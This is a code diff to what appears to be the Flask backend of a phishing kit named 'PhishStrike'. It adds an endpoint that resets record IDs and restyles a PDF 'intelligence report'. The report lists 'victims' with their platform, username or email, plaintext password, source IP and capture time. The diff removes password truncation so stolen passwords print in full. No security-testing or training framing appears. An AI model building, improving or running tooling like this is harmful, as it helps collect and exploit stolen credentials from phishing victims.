@@ -82,6 +82,17 @@ def delete_all_victims():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
+@app.route("/api/reset_ids", methods=["POST"])
+def reset_ids():
+    try:
+        database.reset_ids()
+        log.info("All IDs reset to start from 1")
+        return jsonify({"status": "success"})
+    except Exception as e:
+        log.error(f"Failed to reset IDs: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
 @app.route("/api/export")
 def export_excel():
     try:
@@ -139,116 +150,138 @@ def export_pdf():
 
         class PDF(FPDF):
             def header(self):
-                self.set_font("Helvetica", "B", 18)
-                self.set_text_color(0, 242, 255)
-                self.cell(0, 12, "PHISHSTRIKE INTELLIGENCE REPORT", 0, 1, "C")
-                self.set_line_width(0.5)
-                self.line(10, self.get_y() + 2, 200, self.get_y() + 2)
-                self.ln(5)
-                self.set_font("Helvetica", "I", 9)
-                self.set_text_color(128, 128, 128)
-                self.cell(
-                    0, 8,
-                    f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-                    0, 1, "C",
-                )
-                self.ln(3)
+                # Background color for header
+                self.set_fill_color(15, 23, 42)
+                self.rect(0, 0, 297, 40, 'F')
+                
+                # Main title
+                self.set_font("Helvetica", "B", 24)
+                self.set_text_color(59, 130, 246)
+                self.set_xy(0, 15)
+                self.cell(0, 10, "PHISHSTRIKE INTELLIGENCE REPORT", 0, 1, "C")
+                
+                # Subtitle with generation time
+                self.set_font("Helvetica", "", 10)
+                self.set_text_color(200, 200, 200)
+                self.cell(0, 8, f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", 0, 1, "C")
+                
+                # Decorative line
+                self.set_y(38)
+                self.set_fill_color(59, 130, 246)
+                self.rect(0, 38, 297, 2, 'F')
+                self.ln(10)
 
             def footer(self):
                 self.set_y(-15)
+                self.set_fill_color(15, 23, 42)
+                self.rect(0, 282, 297, 15, 'F')
                 self.set_font("Helvetica", "I", 8)
-                self.set_text_color(128, 128, 128)
-                self.cell(
-                    0, 10,
-                    f"Page {self.page_no()} | PhishStrike © 2025",
-                    0, 0, "C",
-                )
+                self.set_text_color(200, 200, 200)
+                self.cell(0, 10, f"Page {self.page_no()} | PhishStrike © 2025", 0, 0, "C")
 
         pdf = PDF()
-        pdf.set_auto_page_break(auto=True, margin=15)
-        pdf.add_page()
+        pdf.set_auto_page_break(auto=True, margin=10)
+        pdf.add_page(orientation='L')
+        pdf.set_margins(10, 10, 10)
 
-        pdf.set_font("Helvetica", "B", 12)
-        pdf.set_text_color(0, 242, 255)
-        pdf.cell(0, 8, "EXECUTIVE SUMMARY", 0, 1)
-        pdf.ln(2)
+        pdf.set_font("Helvetica", "B", 16)
+        pdf.set_text_color(59, 130, 246)
+        pdf.cell(0, 12, "EXECUTIVE SUMMARY", 0, 1)
+        pdf.ln(5)
 
-        pdf.set_font("Helvetica", "", 10)
-        pdf.set_text_color(0, 0, 0)
+        # Summary box with background
+        pdf.set_fill_color(30, 41, 59)
+        pdf.set_draw_color(59, 130, 246)
+        box_y = pdf.get_y()
+        pdf.rect(10, box_y, 277, 35, 'FD')
+        pdf.set_xy(15, box_y + 12)
+        
+        pdf.set_font("Helvetica", "", 12)
+        pdf.set_text_color(255, 255, 255)
         summary_data = [
             ("Total Infiltrations", str(stats["total"])),
             ("Platforms Targeted", str(len(stats["platforms"]))),
             ("Report Generated", datetime.now().strftime('%Y-%m-%d %H:%M:%S')),
         ]
+        x_pos = 15
         for label, value in summary_data:
-            pdf.set_font("Helvetica", "B", 9)
-            pdf.cell(60, 6, f"{label}:", 0, 0)
-            pdf.set_font("Helvetica", "", 9)
-            pdf.cell(0, 6, value, 0, 1)
+            pdf.set_xy(x_pos, box_y + 12)
+            pdf.set_font("Helvetica", "B", 11)
+            pdf.cell(0, 10, f"{label}:", 0, 0)
+            pdf.set_font("Helvetica", "", 11)
+            pdf.cell(0, 10, f" {value}", 0, 0)
+            x_pos += 95
+        pdf.ln(25)
+
+        pdf.set_font("Helvetica", "B", 16)
+        pdf.set_text_color(59, 130, 246)
+        pdf.cell(0, 12, "PLATFORM DISTRIBUTION", 0, 1)
         pdf.ln(5)
 
-        pdf.set_font("Helvetica", "B", 12)
-        pdf.set_text_color(0, 242, 255)
-        pdf.cell(0, 8, "PLATFORM DISTRIBUTION", 0, 1)
-        pdf.ln(2)
-
-        pdf.set_font("Helvetica", "", 9)
-        pdf.set_text_color(0, 0, 0)
+        # Platform distribution box
+        pdf.set_fill_color(30, 41, 59)
+        pdf.set_draw_color(59, 130, 246)
+        box_y = pdf.get_y()
+        pdf.rect(10, box_y, 277, 30, 'FD')
+        pdf.set_xy(15, box_y + 10)
+        
+        pdf.set_font("Helvetica", "", 11)
+        pdf.set_text_color(255, 255, 255)
+        x_pos = 15
         for platform, count in stats["platforms"]:
-            pdf.cell(80, 6, f"  {platform}", 0, 0)
-            pdf.cell(0, 6, f"{count} credentials", 0, 1)
-        pdf.ln(5)
+            pdf.set_xy(x_pos, box_y + 10)
+            pdf.cell(0, 10, f"{platform}: {count} credentials", 0, 0)
+            x_pos += 140
+        pdf.ln(22)
 
-        pdf.set_font("Helvetica", "B", 12)
-        pdf.set_text_color(0, 242, 255)
-        pdf.cell(0, 8, "COLLECTED INTELLIGENCE", 0, 1)
-        pdf.ln(3)
+        pdf.set_font("Helvetica", "B", 14)
+        pdf.set_text_color(59, 130, 246)
+        pdf.cell(0, 10, "COLLECTED INTELLIGENCE", 0, 1)
+        pdf.ln(5)
 
         pdf.set_font("Helvetica", "B", 9)
         pdf.set_text_color(255, 255, 255)
         pdf.set_fill_color(30, 41, 59)
+        pdf.set_draw_color(59, 130, 246)
 
         headers = [
-            ("ID", 12), ("Platform", 20), ("Username/Email", 35),
-            ("Password", 35), ("Source IP", 25), ("Captured At", 28),
+            ("ID", 8), ("Platform", 30), ("Username/Email", 71),
+            ("Password", 71), ("Source IP", 48), ("Captured At", 48),
         ]
+        col_widths = [w for (_, w) in headers]
+        
         for header, width in headers:
             pdf.cell(width, 8, header, 1, 0, "C", True)
         pdf.ln()
+        
+        # Draw blue border around table
+        pdf.set_draw_color(59, 130, 246)
+        table_width = sum(col_widths)
+        table_x = 10
+        table_y = pdf.get_y() - 8
+        pdf.rect(table_x, table_y, table_width, 8, 'D')
 
-        # Render rows on a single line: truncate values to fit column widths
-        pdf.set_font("Helvetica", "", 8)
+        # Render rows with alternating colors
+        pdf.set_font("Helvetica", "", 9)
         pdf.set_text_color(0, 0, 0)
-        pdf.set_fill_color(248, 250, 252)
+        
+        line_h = 8
 
-        col_widths = [w for (_, w) in headers]
-        line_h = 7
-
-        def _fit_text(text, width, font_name="Helvetica", font_size=8):
+        def _fit_text(text, width, font_name="Helvetica", font_size=9):
             if text is None:
                 return ''
             text = str(text)
             pdf.set_font(font_name, "", font_size)
-            avail = max(1, width - 4)
-            if pdf.get_string_width(text) <= avail:
-                return text
-            lo, hi = 0, len(text)
-            while lo < hi:
-                mid = (lo + hi + 1) // 2
-                candidate = text[:mid] + '...'
-                if pdf.get_string_width(candidate) <= avail:
-                    lo = mid
-                else:
-                    hi = mid - 1
-            k = max(0, lo)
-            return (text[:k] + '...') if k > 0 else '...'
+            # Return full text without truncation
+            return text
 
+        row_count = 0
         for v in victims:
             cells = [str(v[0]), str(v[1]), str(v[2]), (str(v[3]) if v[3] is not None else ''), str(v[4]), str(v[5])]
 
             # page break if needed
             if pdf.get_y() + line_h > pdf.h - pdf.b_margin:
-                pdf.add_page()
+                pdf.add_page(orientation='L')
                 # re-draw headers
                 pdf.set_font("Helvetica", "B", 9)
                 pdf.set_text_color(255, 255, 255)
@@ -256,21 +289,28 @@ def export_pdf():
                 for header, width in headers:
                     pdf.cell(width, 8, header, 1, 0, "C", True)
                 pdf.ln()
-                pdf.set_font("Helvetica", "", 8)
+                pdf.set_font("Helvetica", "", 9)
                 pdf.set_text_color(0, 0, 0)
-                pdf.set_fill_color(248, 250, 252)
+                row_count = 0
 
+            # Alternating row colors
+            if row_count % 2 == 0:
+                pdf.set_fill_color(248, 250, 252)
+            else:
+                pdf.set_fill_color(255, 255, 255)
+            
             for i, txt in enumerate(cells):
                 w = col_widths[i]
                 if i == 3:
-                    fitted = _fit_text(txt, w, font_name="Courier", font_size=8)
-                    pdf.set_font("Courier", "", 8)
+                    fitted = _fit_text(txt, w, font_name="Courier", font_size=9)
+                    pdf.set_font("Courier", "", 9)
                 else:
-                    fitted = _fit_text(txt, w, font_name="Helvetica", font_size=8)
-                    pdf.set_font("Helvetica", "", 8)
+                    fitted = _fit_text(txt, w, font_name="Helvetica", font_size=9)
+                    pdf.set_font("Helvetica", "", 9)
                 align = "C" if i in (0, 4, 5) else "L"
-                pdf.cell(w, line_h, fitted, 1, 0, align)
+                pdf.cell(w, line_h, fitted, 1, 0, align, True)
             pdf.ln()
+            row_count += 1
 
         buf = io.BytesIO(pdf.output())
         filename = f"phishstrike_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
